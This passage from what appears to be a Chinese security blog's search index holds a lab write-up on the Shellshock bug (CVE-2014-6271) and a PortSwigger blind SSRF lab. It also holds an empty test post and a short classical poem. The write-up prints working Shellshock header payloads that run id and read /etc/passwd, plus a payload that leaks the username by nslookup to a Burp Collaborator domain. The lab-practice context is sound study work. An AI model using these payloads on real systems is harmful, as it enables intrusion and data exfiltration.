title="web漏洞检测"></a>web漏洞检测</h3><p><a href="https://www.cnblogs.com/Cl0ud/p/14248937.html">Bash 破壳漏洞Shellshock （CVE-2014-6271）复现分析 - 春告鳥 - 博客园 (cnblogs.com)</a><br>启动vulhub靶场—-Bash Shellshock 破壳漏洞（CVE-2012-6271）(搭建这个b玩意搞端口转发花了我一个多小时)<br>编译运行：</p><pre><code>docker compose up -d</code></pre><p>服务启动后，有两个页面<code>http://your-ip:8080/victim.cgi</code>和<code>http://your-ip:8080/safe.cgi</code>。其中safe.cgi是最新版bash生成的页面，victim.cgi是bash4.3生成的页面。</p><p>其中数据包原本是这样的<br><img src="/attachment/Pasted%20image%2020240611001752.png"></p><p>将payload附在User-Agent中访问victim.cgi：</p><pre><code>User-Agent: () &#123; foo; &#125;; echo Content-Type: text/plain; echo; /usr/bin/id</code></pre><p>命令成功被执行：<br><img src="/attachment/Pasted%20image%2020240611003037.png"><br>同样的数据包访问safe.cgi，不受影响：<br><img src="/attachment/Pasted%20image%2020240611003107.png"></p><p>当然这个漏洞也可以执行别的命令比如说<code>cat /etc/passwd</code><br><img src="/attachment/Pasted%20image%2020240611003449.png"></p><h3 id="开始正题"><a href="#开始正题" class="headerlink" title="开始正题"></a>开始正题</h3><p>访问靶场<a href="https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation">Lab: Blind SSRF with Shellshock exploitation | Web Security Academy (portswigger.net)</a><br>靶场说, 该网站使用分析软件，当加载产品页面时，该软件会获取Referer标头中指定的URL。<br>所以我们要在referer头中插入我们想让它访问的网站, 也就是内部网络中<code>192.168.0.X:8080</code>的管理界面</p><p>当我们点击其中一个产品的时候抓取的数据包如下<br><img src="/attachment/Pasted%20image%2020240611005908.png"><br>在intruder模块中添加爆破ip地址(即192.168.0.1~192.168.0.254)<br><img src="/attachment/Pasted%20image%2020240611010031.png"><br><img src="/attachment/Pasted%20image%2020240611010056.png"><br>这里先不着急开始攻击</p><p>我们还要在UA中添加payload</p><p>由于这里没有回显, 所以使用DNS外带的方式</p><p><code>nslookup</code>命令可以请求一个域名<br>我们可以构造出这个命令<code>nslookup $(whoami).yuming.com</code><br>使用$(whoami)查询出当前的用户名, 如此一来, 用户名就会被拼接到后面的字符串中, 进而被我们查到DNS解析记录</p><p>启动burp的collaborator<br><img src="/attachment/Pasted%20image%2020240611010543.png"><br><img src="/attachment/Pasted%20image%2020240611010617.png"><br>即可获得一个域名<br>所以刚才那条命令就是<code>nslookup $(whoami).x97ikd34fj1pyvk8ka3q16b0lrrif83x.oastify.com</code><br>改成绝对路径<code>/usr/bin/nslookup $(whoami).x97ikd34fj1pyvk8ka3q16b0lrrif83x.oastify.com</code></p><p>再改造成payload<code>() &#123; :; &#125;; /usr/bin/nslookup $(whoami).x97ikd34fj1pyvk8ka3q16b0lrrif83x.oastify.com</code><br>拼接到刚才构造的那里<br><img src="/attachment/Pasted%20image%2020240611010923.png"><br>然后Start attack<br>回到collaborator模块<br><img src="/attachment/Pasted%20image%2020240611011846.png"><br>看到这里有两个DNS记录(本来就是1,2两条, 但是由于我多按了一次, 所以图片是4条)</p><p><code>The Collaborator server received a DNS ookup of type A for the domain name peter-hZ11Xr.x97ikd34fj1pyvk8ka3q16b0lrrif83x.oastify.com.</code></p><p>可以得到用户名就是域名前面的<code>peter-hZ11Xr</code></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>测试文章</title>
    <link href="/2024/09/23/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/"/>
    <url>/2024/09/23/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/</url>
    
    <content type="html"><![CDATA[<h3 id="ez-php-jail"><a href="#ez-php-jail" class="headerlink" title="ez_php_jail"></a>ez_php_jail</h3><p>![](&#x2F;images&#x2F;Pasted image 20240916002843.png)</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>绛春城文选 639</title>
    <link href="/2023/06/15/%E7%BB%9B%E6%98%A5%E5%9F%8E%E6%96%87%E9%80%89-639/"/>
    <url>/2023/06/15/%E7%BB%9B%E6%98%A5%E5%9F%8E%E6%96%87%E9%80%89-639/</url>
    
    <content type="html"><![CDATA[<p>棠虾赤.游鄂          v1.0    by FHK_KMD终晨<br>粼粼楚水两汉路，繁华处，几曾都。雪柳裙群芙莺肤，笑语常驻，行客意足。<br>昭君广场屈原墓，千年怨，至今孤。庄王问鼎，辛亥逐鹿。江心星如鼓，街上人踟蹰。<br>                                -&gt;游 楚河汉街 作  </p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
